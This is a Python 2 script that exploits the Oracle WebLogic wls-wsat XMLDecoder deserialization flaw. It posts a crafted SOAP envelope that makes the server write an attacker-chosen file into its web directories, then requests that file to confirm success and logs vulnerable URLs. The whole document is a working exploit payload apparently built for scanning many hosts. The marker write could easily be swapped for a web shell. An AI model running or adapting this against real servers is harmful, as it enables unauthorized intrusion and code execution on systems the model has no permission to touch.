#coding:utf-8
import requests
import threading
import time
import Queue

shell_path_list = ['bea_wls_internal/9j4dqk/war/wgic.txt','wls-wsat/54p17w/war/wgic.txt']
shell_content = '20171027100000000'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110',
           'Content-Type':'text/xml',
           'Connection': 'close'
    }

#url = 'http://10.208.217.75:7001/'

def verify(url):
    for shell_path in shell_path_list:
        try:
            #print shell_path
            data = '''
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java><java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/'''+ shell_path + '''</string><void method="println"><string>'''+ shell_content +'''</string>
                </void><void method="close"/></void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
            '''
            url1 =  url +  '/wls-wsat/CoordinatorPortType'
            #print url1
            requests.post(url1,data=data,headers=headers,timeout=0.5)
        except:
            continue
    try:
        r1 = requests.get(url + '/bea_wls_internal/wgic.txt' ,headers = headers,timeout=0.5)
        if shell_content in r1.content:
            print 'Success:%s/bea_wls_internal/wgic.txt'%(url)
            with open('success.txt','a') as f:
                f.write(url + '/bea_wls_internal/wgic.txt\n')
    except:
        pass
    try:
        r2 = requests.get(url + '/wls-wsat/wgic.txt' ,headers = headers,timeout=0.5)
        if shell_content in r2.content:
            print 'Success:%s/wls-wsat/wgic.txt'%(url)
            with open('success.txt','a') as f:
                f.write(url + '/wls-wsat/wgic.txt\n')
    except:
        pass

#verify(url)

